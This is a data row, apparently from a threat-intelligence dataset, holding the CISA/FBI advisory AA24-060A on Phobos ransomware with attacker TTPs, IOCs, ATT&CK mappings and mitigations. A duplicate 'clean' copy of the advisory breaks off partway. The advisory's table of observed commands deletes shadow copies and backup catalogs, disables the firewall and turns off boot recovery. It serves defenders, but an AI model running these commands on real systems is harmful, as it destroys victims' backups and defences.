,RawText,TTP,CleanText,URL
0,"






Actions to take today to mitigate Phobos ransomware activity:




Secure RDP ports to prevent threat actors from abusing and leveraging RDP tools.
Prioritize remediating known exploited vulnerabilities.
Implement EDR solutions to disrupt threat actor memory allocation techniques.







SUMMARY
Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), and the Multi-State Information Sharing and Analysis Center (MS-ISAC) are releasing this joint CSA, to disseminate known TTPs and IOCs associated with the Phobos ransomware variants observed as recently as February 2024, according to open source reporting. Phobos is structured as a ransomware-as-a-service (RaaS) model. Since May 2019, Phobos ransomware incidents impacting state, local, tribal, and territorial (SLTT) governments have been regularly reported to the MS-ISAC. These incidents targeted municipal and county governments, emergency services, education, public healthcare, and other critical infrastructure entities to successfully ransom several million U.S. dollars.[1],[2]
The FBI, CISA, and the MS-ISAC encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of Phobos ransomware and other ransomware incidents.
Download the PDF version of this report:


AA24-060A #StopRansomware: Phobos Ransomware
(PDF,       678.84 KB
  )


For a downloadable copy of indicators of compromise (IOCs), see:


AA24-060A STIX XML
(XML,       147.73 KB
  )




AA24-060A STIX JSON
(JSON,       119.53 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 14. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK® tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Overview
According to open source reporting, Phobos ransomware is likely connected to numerous variants (including Elking, Eight, Devos, Backmydata, and Faust ransomware) due to similar TTPs observed in Phobos intrusions. Phobos ransomware operates in conjunction with various open source tools such as Smokeloader, Cobalt Strike, and Bloodhound. These tools are all widely accessible and easy to use in various operating environments, making it (and associated variants) a popular choice for many threat actors.[3],[4]
Reconnaissance and Initial Access
Phobos actors typically gain initial access to vulnerable networks by leveraging phishing campaigns [T1598] to drop hidden payloads or using internet protocol (IP) scanning tools, such as Angry IP Scanner, to search for vulnerable Remote Desktop Protocol (RDP) ports [T1595.001] or by leveraging RDP on Microsoft Windows environments.[5],[6]
Once they discover an exposed RDP service, the actors use open source brute force tools to gain access [T1110]. If Phobos actors gain successful RDP authentication [T1133][T1078] in the targeted environment, they perform open source research to create a victim profile and connect the targeted IP addresses to their associated companies [T1593]. Threat actors leveraging Phobos have notably deployed remote access tools to establish a remote connection within the compromised network [T1219].[7]
Alternatively, threat actors send spoofed email attachments [T1566.001] that are embedded with hidden payloads [T1204.002] such as SmokeLoader, a backdoor trojan that is often used in conjunction with Phobos. After SmokeLoader’s hidden payload is downloaded onto the victim’s system, threat actors use the malware’s functionality to download the Phobos payload and exfiltrate data from the compromised system.
Execution and Privilege Escalation
Phobos actors run executables like 1saas.exe or cmd.exe to deploy additional Phobos payloads that have elevated privileges enabled [TA0004]. Additionally, Phobos actors can use the previous commands to perform various windows shell functions. The Windows command shell enables threat actors to control various aspects of a system, with multiple permission levels required for different subsets of commands [T1059.003][T1105].[8]
Smokeloader Deployment
Phobos operations feature a standard three phase process to decrypt a payload that allows the threat actors to deploy additional destructive malware.[9]
For the first phase, Smokeloader manipulates either VirtualAlloc or VirtualProtect API functions—which opens an entry point, enabling code to be injected into running processes and allowing the malware to evade network defense tools [T1055.002]. In the second phase, a stealth process is used to obfuscate command and control (C2) activity by producing requests to legitimate websites [T1001.003].[10]
Within this phase, the shellcode also sends a call from the entry point to a memory container [T1055.004] and prepares a portable executable for deployment in the final stage [T1027.002][T1105][T1140].
Finally, once Smokeloader reaches its third stage, it unpacks a program-erase cycle from stored memory, which is then sent to be extracted from a SHA 256 hash as a payload.[7] Following successful payload decryption, the threat actors can begin downloading additional malware.
Additional Phobos Defense Evasion Capabilities
Phobos ransomware actors have been observed bypassing organizational network defense protocols by modifying system firewall configurations using commands like netsh firewall set opmode mode=disable [T1562.004]. Additionally, Phobos actors can evade detection by using the following tools: Universal Virus Sniffer, Process Hacker, and PowerTool [T1562].
Persistence and Privilege Escalation
According to open source reporting, Phobos ransomware uses commands such as Exec.exe or the bcdedit[.]exe control mechanism. Phobos has also been observed using Windows Startup folders and Run Registry Keys such as C:/Users\Admin\AppData\Local\directory [T1490][T1547.001] to maintain persistence within compromised environments.[5]
Additionally, Phobos actors have been observed using built-in Windows API functions [T1106] to steal tokens [T1134.001], bypass access controls, and create new processes to escalate privileges by leveraging the SeDebugPrivilege process [T1134.002]. Phobos actors attempt to authenticate using cached password hashes on victim machines until they reach domain administrator access [T1003.005].
Discovery and Credential Access
Phobos actors additionally use open source tools [T1588.002] such as Bloodhound and Sharphound to enumerate the active directory [T1087.002]. Mimikatz and NirSoft, as well as Remote Desktop Passview to export browser client credentials [T1003.001][T1555.003], have also been used. Furthermore, Phobos ransomware is able to enumerate connected storage devices [T1082], running processes [T1057], and encrypt user files [T1083].
Exfiltration
Phobos actors have been observed using WinSCP and Mega.io for file exfiltration.[11] They use WinSCP to connect directly from a victim network to an FTP server [T1071.002] they control [TA0010]. Phobos actors install Mega.io [T1048] and use it to export victim files directly to a cloud storage provider [T1567.002]. Data is typically archived as either a .rar or .zip file [T1560] to be later exfiltrated. They target legal documentation, financial records, technical documents (including network architecture), and databases for commonly used password management software [T1555.005].
Impact
After the exfiltration phase, Phobos actors then hunt for backups. They use vssadmin.exe and Windows Management Instrumentation command-line utility (WMIC) to discover and delete volume shadow copies in Windows environments. This prevents victims from recovering files after encryption has taken place [T1047][T1490].
Phobos.exe contains functionality to encrypt all connected logical drives on the target host [T1486]. Each Phobos ransomware executable has unique build identifiers (IDs), affiliate IDs, as well as a unique ransom note which is embedded in the executable. After the ransom note has populated on infected workstations, Phobos ransomware continues to search for and encrypt additional files.
Most extortion [T1657] occurs via email; however, some affiliate groups have used voice calls to contact victims. In some cases, Phobos actors have used onion sites to list victims and host stolen victim data. Phobos actors use various instant messaging applications such as ICQ, Jabber, and QQ to communicate [T1585]. See Figure 2 for a list of email providers used by the following Phobos affiliates: Devos, Eight, Elbie, Eking, and Faust.[6]

 

Figure 1: Phobos Affiliate Providers List

INDICATORS OF COMPROMISE (IOCs)
See Table 1 through 6 for IOCs obtained from CISA and the FBI investigations from September through November 2023.

Table 1: Associated Phobos Domains


Associated Phobos Domains




adstat477d[.]xyz


demstat577d[.]xyz [12]


serverxlogs21[.]xyz




Table 2: Observed Phobos Shell Commands


Shell Commands




vssadmin delete shadows /all /quiet [T1490]


netsh advfirewall set currentprofile state off


wmic shadowcopy delete


netsh firewall set opmode mode=disable [T1562.004]


bcdedit /set {default} bootstatuspolicy ignoreallfailures [T1547.001]


bcdedit /set {default} recoveryenabled no [T1490]


wbadmin delete catalog -quiet


mshta C:\%USERPROFILE%\Desktop\info.hta [T1218.005]


mshta C:\%PUBLIC%\Desktop\info.hta


mshta C:\info.hta



The commands above are observed during the execution of a Phobos encryption executable. A Phobos encryption executable spawns a cmd.exe process, which then executes the commands listed in Table 1 with their respective Windows system executables. When the commands above are executed on a Windows system, volume shadow copies are deleted and Windows Firewall is disabled. Additionally, the system’s boot status policy is set to boot even when there are errors during the boot process, and automatic recovery options, like Windows Recovery Environment (WinRE), are disabled for the given boot entry. The system’s backup catalog is also deleted. Finally, the Phobos ransom note is displayed to the end user using mshta.exe.

Table 3: Observed Phobos Registry Keys


Registry Keys




HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\<Phobos exe name>


C:/Users\Admin\AppData\Local\directory




Table 4: Observed Phobos Actor Email Addresses


Email Addresses
 




AlbetPattisson1981@protonmail[.]com
henryk@onionmail[.]org


atomicday@tuta[.]io
info@fobos[.]one


axdus@tuta[.]io
it.issues.solving@outlook[.]com


barenuckles@tutanota[.]com
JohnWilliams1887@gmx[.]com


Bernard.bunyan@aol[.]com
jonson_eight@gmx[.]us


bill.g@gmx[.]com
joshuabernandead@gmx[.]com


bill.g@msgsafe[.]io
LettoIntago@onionmail[.]com


bill.g@onionmail[.]org
Luiza.li@tutanota[.]com


bill.gTeam@gmx[.]com
MatheusCosta0194@gmx[.]com


blair_lockyer@aol[.]com
mccreight.ellery@tutanota[.]com


CarlJohnson1948@gmx[.]com
megaport@tuta[.]io


cashonlycash@gmx[.]com
miadowson@tuta[.]io


chocolate_muffin@tutanota[.]com
MichaelWayne1973@tutanota[.]com


claredrinkall@aol[.]com
normanbaker1929@gmx[.]com


clausmeyer070@cock[.]li
nud_satanakia@keemail[.]me


colexpro@keemail[.]me
please@countermail[.]com


cox.barthel@aol[.]com
precorpman@onionmail[.]org


crashonlycash@gmx[.]com
recovery2021@inboxhub[.]net


everymoment@tuta[.]io
recovery2021@onionmail[.]org


expertbox@tuta[.]io
SamuelWhite1821@tutanota[.]com


fastway@tuta[.]io
SaraConor@gmx[.]com


fquatela@techie[.]com
secdatltd@gmx[.]com


fredmoneco@tutanota[.]com
skymix@tuta[.]io


getdata@gmx[.]com
sory@countermail[.]com


greenbookBTC@gmx[.]com
spacegroup@tuta[.]io


greenbookBTC@protonmail[.]com
stafordpalin@protonmail[.]com


helperfiles@gmx[.]com
starcomp@keemail[.]me


helpermail@onionmail[.]org
xdone@tutamail[.]com


helpfiles@onionmail[.]org
xgen@tuta[.]io


helpfiles102030@inboxhub[.]net
xspacegroup@protonmail[.]com


helpforyou@gmx[.]com
zgen@tuta[.]io


helpforyou@onionmail[.]org
zodiacx@tuta[.]io




Table 5: Observed Phobos Actor Telegram Username


Telegram Username




@phobos_support




Table 6: Observed Phobos Actor Wickr Address


Wickr Address






Vickre me





Disclaimer: Organizations are encouraged to investigate the use of the IOCs in Table 7 for related signs of compromise prior to performing remediation actions.

Table 7: Phobos IOCs from September through December 2023


Associated IP Address
File Type
File Name
SHA 256 Hash




194.165.16[.]4 (October 2023)
Win32.exe
Ahpdate.exe [13]
0000599cbc6e5b0633c5a6261c79e4d3d81005c77845c6b0679d854884a8e02f



45.9.74[.]14 (December 2023)
147.78.47[.]224 (December 2023)

Executable and Linkable Format (ELF) [14]

1570442295
(Trojan Linux Mirai)

7451be9b65b956ee667081e1141531514b1ec348e7081b5a9cd1308a98eec8f0


185.202.0[.]111 (September 2023)
Win32.exe [15]
cobaltstrike_shellcode[.]exe (C2 activity)
 


185.202.0[.]111 (December 2023)
.txt [16]
f1425cff3d28afe5245459afa6d7985081bc6a62f86dce64c63daeb2136d7d2c.bin (Trojan)
 



Disclaimer: Organizations are encouraged to investigate the use of the file hashes in Tables 8 and 9 for related signs of compromise prior to performing remediation actions.

Table 8: Phobos Actor File Hashes Observed in October 2023


Phobos Ransomware SHA 256 Malicious Trojan Executable File Hashes




518544e56e8ccee401ffa1b0a01a10ce23e49ec21ec441c6c7c3951b01c1b19c


9215550ce3b164972413a329ab697012e909d543e8ac05d9901095016dd3fc6c


482754d66d01aa3579f007c2b3c3d0591865eb60ba60b9c28c66fe6f4ac53c52


c0539fd02ca0184925a932a9e926c681dc9c81b5de4624250f2dd885ca5c4763




Table 9: Phobos Actor File Hashes from Open Source from November 2023 [17]


Phobos Ransomware SHA 256 File Hashes




58626a9bfb48cd30acd0d95debcaefd188ae794e1e0072c5bde8adae9bccafa6


f3be35f8b8301e39dd3dffc9325553516a085c12dc15494a5e2fce73c77069ed


518544e56e8ccee401ffa1b0a01a10ce23e49ec21ec441c6c7c3951b01c1b19c


32a674b59c3f9a45efde48368b4de7e0e76c19e06b2f18afb6638d1a080b2eb3


2704e269fb5cf9a02070a0ea07d82dc9d87f2cb95e60cb71d6c6d38b01869f66


fc4b14250db7f66107820ecc56026e6be3e8e0eb2d428719156cf1c53ae139c6


a91491f45b851a07f91ba5a200967921bf796d38677786de51a4a8fe5ddeafd2



MITRE ATT&CK TECHNIQUES
See Table 10 through 22 for all threat actor tactics and techniques referenced in this advisory.

Table 10: Phobos Threat Actors ATT&CK Techniques for Enterprise – Reconnaissance


Technique Title
ID
Use




Search Open Websites/Domains
T1593
Phobos actors perform open source research to find information about victims that can be used during targeting to create a victim profile.


Scanning IP Blocks
T1595.001
Phobos actors used IP scanning tools to include Angry IP Scanner to search for vulnerable RDP ports.


Phishing for Information
T1598
Phobos actors use phishing campaigns to social engineer information from users and gain access to vulnerable RDP ports.




Table 11: Phobos Threat Actors ATT&CK Techniques for Enterprise – Resource Development


Technique Title
ID
Use




Establish Accounts
T1585
Phobos actors establish accounts to communicate.


Obtain Capabilities: Tool
T1588.002
Phobos actors used open source tools in their attack.




Table 12: Phobos Threat Actors ATT&CK Techniques for Enterprise – Initial Access


Technique Title
ID
Use




Valid Accounts
T1078
Following successful RDP authentication, Phobos actors search for IP addresses and pair them with their associated computer to create a victim profile.


External Remote Services
T1133
Phobos actors may leverage external-facing remote services to initially access and/or persist within a network.


Phishing: Spearphishing Attachment
T1566.001
Phobos actors used a spoofed email attachment to execute attack.




Table 13: Phobos Threat Actors ATT&CK Techniques for Enterprise – Execution


Technique Title
ID
Use




Windows Management Instrumentation
T1047
Phobos actors used Windows Management Instrumentation command-line utility (WMIC) to prevent victims from recovering files.


Windows Command Shell
T1059.003
Phobos actors can use the previous commands to perform commands with windows shell functions.


Native API
T1106
Phobos actors used open source tools to enumerate the active directory.


Malicious File
T1204.002
Phobos actors attached a malicious email attachment to deliver ransomware.




Table 14: Phobos Threat Actors ATT&CK Techniques for Enterprise – Persistence


Technique Title
ID
Use




Registry Run Keys / Startup Folder
T1547.001
Phobos ransomware operates using the Exec.exe control mechanism and has been observed using Windows Startup folders and Run Registry Keys.




Table 15: Phobos Threat Actors ATT&CK Techniques for Enterprise – Privilege Escalation


Technique Title
ID
Use




Privilege Escalation
TA0004
Phobos actors use run commands like 1saas.exe, or cmd.exe to deploy additional Phobos payloads with escalated privileges.


Portable Executable Injection
T1055.002
Phobos actors use Smokeloader to inject code into running processes to identify an entry point through enabling a VirtualAlloc or VirtualProtect process.


Asynchronous Procedure Call
T1055.004
During phase two of execution, Phobos ransomware sends a call back from an identified entry point.


Access Token Manipulation: Token Impersonation/Theft
T1134.001
Phobos actors can use Windows API functions to steal tokens.


Create Process with Token
T1134.002
Phobos actors used Windows API functions to steal tokens, bypass access controls and create new processes.




Table 16: Phobos Threat Actors ATT&CK Techniques for Enterprise – Defense Evasion


Technique Title
ID
Use




Software Packing
T1027.002
Phobos actors deployed a portable executable (PE) to conceal code.


Embedded Payloads
T1027.009
Phobos actors embedded the ransomware as a hidden payload by using Smokeloader.


Deobfuscate/Decode Files or Information
T1140
During phase two of execution, Phobos actors’ malware stores and decrypts information.


System Binary Proxy Execution: Mshta
T1218.005
Phobos actors used Mshta to execute malicious files.


Impair Defenses
T1562
Phobos actors can use Universal Virus Sniffer, Process Hacker, and PowerTool to evade detection.


Disable or Modify System Firewall
T1562.004
Phobos ransomware has been observed bypassing organizational network defense protocols through modifying system firewall configurations.




Table 17: Phobos Threat Actors ATT&CK Techniques for Enterprise – Credential Access


Technique Title
ID
Use




OS Credential Dumping: LSASS Memory
T1003.001
Phobos actors used Mimikatz to export credentials.


OS Credential Dumping: Cached Domain Credentials
T1003.005
Phobos actors use cached domain credentials to authenticate as the domain administrator in the event a domain controller is unavailable.


Brute Force
T1110
Phobos actors may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained.


Credentials from Password Stores
T1555
Phobos actors may search for common password storage locations to obtain user credentials.


Credentials from Password Stores: Credentials from Web Browsers
T1555.003

Phobos actors use Nirsoft or Passview to export client credentials from web browsers.
Phobos actors search for stored credentials in browser clients once they gain initial network access.



Credentials from Password Stores: Password Managers
T1555.005
Phobos actors targeted victim’s databases for password management software.




Table 18: Phobos Threat Actors ATT&CK Techniques for Enterprise – Discovery


Technique Title
ID
Use




Process Discovery
T1057
Phobos ransomware is able to run processes.


System Information Discovery
T1082
Phobos ransomware is able to enumerate connected storage devices.


File and Directory Discovery
T1083
Phobos ransomware can encrypt user files.


Domain Account
T1087.002
Phobos threat actor used Bloodhound and Sharphound to enumerate the active directory.




Table 19: Phobos Threat Actors ATT&CK Techniques for Enterprise – Collection


Technique Title
ID
Use




Archive Collected Data
T1560
Phobos threat actors archive data as either a .rar or .zip file to be later exfiltrated.




Table 20: Phobos Threat Actors ATT&CK Techniques for Enterprise – Command and Control


Technique Title
ID
Use




Data Obfuscation: Protocol Impersonation
T1001.003
Phobos actors used a stealth process to obfuscate C2 activity.


File Transfer Protocols
T1071.002
Phobos threat actors used WinSCP to connect the victim’s network to an FTP server.


Ingress Tool Transfer
T1105
Phobos ransomware extracts its final payload from the hashed file.


Remote Access Software
T1219
Phobos threat actors used remote access tools to establish a remote connection within victim’s network.




Table 21: Phobos Threat Actors ATT&CK Techniques for Enterprise – Exfiltration


Technique Title
ID
Use




Exfiltration
TA0010
Phobos threat actors may use exfiltration techniques to steal data from your network.


Exfiltration Over Alternative Protocol
T1048
Phobos threat actors use software to export files to a cloud.


Exfiltration to Cloud Storage
T1567.002
Phobos threat actors use Mega.io to exfiltrate data to a cloud storage service rather than over their primary command and control channel.




Table 22: Phobos Threat Actors ATT&CK Techniques for Enterprise – Impact


Technique Title
ID
Use




Data Encrypted for Impact
T1486
Phobos threat actors use the Phobos.exe command to encrypt data on all logical drives connected to the network.


Inhibit System Recovery
T1490
Phobos threat actors may delete or remove backups to include volume shadow copies from Windows environments to prevent victim data recovery response efforts.


Financial Theft
T1657
Phobos threat actor’s extort victims for financial gain.



MITIGATIONS
Secure by Design and Default Mitigations:
These mitigations apply to all critical infrastructure organizations and network defenders. The FBI, CISA, and MS-ISAC recommend that software manufacturers incorporate secure by design and default principles and tactics into their software development practices limiting the impact of ransomware techniques, thus, strengthening the secure posture for their customers.
For more information on secure by design, see CISA’s Secure by Design webpage and joint guide.
The FBI, CISA, and MS-ISAC recommend organizations implement the mitigations below to improve your organization’s cybersecurity posture against actors’ activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.

Secure remote access software by applying recommendations from the joint Guide to Securing Remote Access Software.
Implement application controls to manage and control execution of software, including allowlisting remote access programs.

Application controls should prevent installation and execution of portable versions of unauthorized remote access and other software. A properly configured application allowlist solution will block any unlisted application execution. Allowlisting is important because antivirus solutions may fail to detect the execution of malicious portable executables when the files use any combination of compression, encryption, or obfuscation.


Implement log collection best practices and use intrusion detection systems to defend against threat actors manipulating firewall configurations through early detection [CPG 2.T].

Implement EDR solutions to disrupt threat actor memory allocation techniques.


Strictly limit the use of RDP and other remote desktop services. If RDP is necessary, rigorously apply best practices, for example [CPG 2.W]:

Audit the network for systems using RDP.
Close unused RDP ports.
Enforce account lockouts after a specified number of attempts.
Apply phishing-resistant multifactor authentication (MFA).
Log RDP login attempts.


Disable command-line and scripting activities and permissions [CPG 2.N].
Review domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts [CPG 4.C].
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege (PoLP) [CPG 2.E].
Reduce the threat of credential compromise via the following:

Place domain admin accounts in the protected users’ group to prevent caching of password hashes locally.
Refrain from storing plaintext credentials in scripts.


Implement time-based access for accounts at the admin level and higher [CPG 2.A, 2.E].

In addition, the authoring authorities of this CSA recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques, and to reduce the impact and risk of compromise by ransomware or data extortion actors:

Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, or the cloud).
Maintain offline backups of data and regularly maintain backup and restoration (daily or weekly at minimum). By instituting this practice, an organization limits the severity of disruption to its business practices [CPG 2.R].
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with NIST's standards for developing and managing password policies.

Use longer passwords consisting of at least 15 characters and no more than 64 characters in length [CPG 2.B].
Store passwords in hashed format using industry-recognized password managers.
Add password user “salts” to shared login credentials.
Avoid reusing passwords [CPG 2.C].
Implement multiple failed login attempt account lockouts [CPG 2.G].
Disable password “hints.”
Refrain from requiring password changes more frequently than once per year.Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software.


Require phishing-resistant multifactor authentication (MFA) for all services to the extent possible, particularly for webmail, virtual private networks (VPNs), and accounts that access critical systems [CPG 2.H].
Segment networks to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement [CPG 2.F].
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic and activity, including lateral movement, on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host [CPG 3.A].
Install, regularly update, and enable real time detection for antivirus software on all hosts.
Disable unused ports and protocols [CPG 2.V].
Consider adding an email banner to emails received from outside your organization [CPG 2.M].
Disable hyperlinks in received emails.
Ensure all backup data is encrypted, immutable (i.e., ensure backup data cannot be altered or deleted), and covers the entire organization’s data infrastructure [CPG 2.K, 2.L, 2.R].

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, the FBI, CISA, and MS-ISAC recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The FBI, CISA, and MS-ISAC recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 4-16).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

The FBI, CISA, and MS-ISAC recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
Resource to mitigate a ransomware attack: CISA, NSA, FBI, and Multi-State Information Sharing and Analysis Center’s (MS-ISAC) Joint #StopRansomware Guide.
SLTT organizations are encouraged to implement MS-ISAC’s Ransomware Defense-in-Depth guidance.
No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment.
CISA: Known Exploited Vulnerabilities Catalog
CISA, MITRE: Best Practices for MITRE ATT&CK Mapping
CISA: Decider Tool
CISA: Cross-Sector Cybersecurity Performance Goals
CISA: Secure by Design
CISA: Implementing Phishing-Resistant MFA
CISA: Guide to Securing Remote Access Software

REFERENCES
[1] Privacy Affairs: “Moral” 8Base Ransomware Targets 2 New Victims[2] VMware: 8base ransomware: A Heavy Hitting Player[3] Infosecurity Magazine: Phobos Ransomware Family Expands With New FAUST Variant[4] The Record: Hospitals offline across Romania following ransomware attack on IT platform[5] Comparitech: What is Phobos Ransomware & How to Protect Against It?[6] Cisco Talos: Understanding the Phobos affiliate structure and activity[7] Cisco Talos: A deep dive into Phobos ransomware, recently deployed by 8Base group[8] Malwarebytes Labs: A deep dive into Phobos ransomware[9] Any Run: Smokeloader[10] Malpedia: Smokeloader[11] Truesec: A case of the FAUST Ransomware[12] VirusTotal: Phobos Domain #1[13] VirusTotal: Phobos executable: Ahpdate.exe[14] VirusTotal: Phobos GUI extension: ELF File[15] VirusTotal: Phobos IP address: 185.202.0[.]111[16] VirusTotal: Phobos GUI extension: Binary File[17] Cisco Talos GitHub: IOCs/2023/11/deep-dive-into-phobos-ransomware.txt at main
REPORTING
The FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom-note, communications with Phobos actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file.
Additional details requested include: a targeted company point of contact, status and scope of infection, estimated loss, operational impact, transaction IDs, date of infection, date detected, initial attack vector, and host and network-based indicators.
The FBI and CISA do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to the FBI Internet Crime Complaint Center (IC3), a local FBI Field Office, or to CISA at report@cisa.gov or by calling 1-844-Say-CISA (1-844-729-2472).
DISCLAIMER
The FBI does not conduct its investigative activities or base attribution solely on activities protected by the First Amendment. Your company has no obligation to respond or provide information back to the FBI in response to this engagement. If, after reviewing the information, your company decides to provide referral information to the FBI, it must do so in a manner consistent with federal law. The FBI does not request or expect your company to take any particular action regarding this information other than holding it in confidence due to its sensitive nature.
The information in this report is being provided “as is” for informational purposes only. The FBI and CISA not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise does not constitute or imply endorsement, recommendation, or favoring by CISA, the FBI, and the MS-ISAC.
ACKNOWLEDGEMENTS
The California Joint Regional Intelligence Center (JRIC, CA) and Israel National Cyber Directorate (INCD) contributed to this CSA.
VERSION HISTORY
February 29, 2024: Initial version.






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1083', 'T1071.002', 'T1055.004', 'T1657', 'T1055.002', 'T1219', 'T1490', 'T1588.002', 'TA0010', 'T1027.009', 'T1593', 'T1134.001', 'T1560', 'T1204.002', 'T1555', 'T1562', 'T1087.002', 'T1110', 'T1003.005', 'T1105', 'T1003.001', 'T1082', 'T1567.002', 'T1140', 'T1218.005', 'T1134.002', 'T1595.001', 'T1078', 'T1001.003', 'T1057', 'T1566.001', 'T1555.005', 'T1133', 'T1027.002', 'T1547.001', 'T1598', 'T1486', 'TA0004', 'T1047', 'T1106', 'T1059.003', 'T1585', 'T1555.003', 'T1048', 'T1562.004'}","






Actions to take today to mitigate Phobos ransomware activity:




Secure RDP ports to prevent threat actors from abusing and leveraging RDP tools.
Prioritize remediating known exploited vulnerabilities.
Implement EDR solutions to disrupt threat actor memory allocation techniques.







SUMMARY
Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), and the Multi-State Information Sharing and Analysis Center (MS-ISAC) are releasing this joint CSA, to disseminate known TTPs and IOCs associated with the Phobos ransomware variants observed as recently as February 2024, according to open source reporting. Phobos is structured as a ransomware-as-a-service (RaaS) model. Since May 2019, Phobos ransomware incidents impacting state, local, tribal, and territorial (SLTT) governments have been regularly reported to the MS-ISAC. These incidents targeted municipal and county governments, emergency services, education, public healthcare, and other critical infrastructure entities to successfully ransom several million U.S. dollars.,1,2,
The FBI, CISA, and the MS-ISAC encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of Phobos ransomware and other ransomware incidents.
Download the PDF version of this report:


AA24-060A #StopRansomware: Phobos Ransomware
(PDF,       678.84 KB
  )


For a downloadable copy of indicators of compromise (IOCs), see:


AA24-060A STIX XML
(XML,       147.73 KB
  )




AA24-060A STIX JSON
(JSON,       119.53 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 14. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK® tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Overview
According to open source reporting, Phobos ransomware is likely connected to numerous variants (including Elking, Eight, Devos, Backmydata, and Faust ransomware) due to similar TTPs observed in Phobos intrusions. Phobos ransomware operates in conjunction with various open source tools such as Smokeloader, Cobalt Strike, and Bloodhound. These tools are all widely accessible and easy to use in various operating environments, making it (and associated variants) a popular choice for many threat actors.,3,4,
Reconnaissance and Initial Access
Phobos actors typically gain initial access to vulnerable networks by leveraging phishing campaigns, to drop hidden payloads or using internet protocol (IP) scanning tools, such as Angry IP Scanner, to search for vulnerable Remote Desktop Protocol (RDP) ports, or by leveraging RDP on Microsoft Windows environments.,5,6,
Once they discover an exposed RDP service, the actors use open source brute force tools to gain access,. If Phobos actors gain successful RDP authentication, in the targeted environment, they perform open source research to create a victim profile and connect the targeted IP addresses to their associated companies,. Threat actors leveraging Phobos have notably deployed remote access tools to establish a remote connection within the compromised network,.,7,
Alternatively, threat actors send spoofed email attachments, that are embedded with hidden payloads, such as SmokeLoader, a backdoor trojan that is often used in conjunction with Phobos. After SmokeLoader’s hidden payload is downloaded onto the victim’s system, threat actors use the malware’s functionality to download the Phobos payload and exfiltrate data from the compromised system.
Execution and Privilege Escalation
Phobos actors run executables like 1saas.exe or cmd.exe to deploy additional Phobos payloads that have elevated privileges enabled,. Additionally, Phobos actors can use the previous commands to perform various windows shell functions. The Windows command shell enables threat actors to control various aspects of a system, with multiple permission levels required for different subsets of commands,.,8,
Smokeloader Deployment
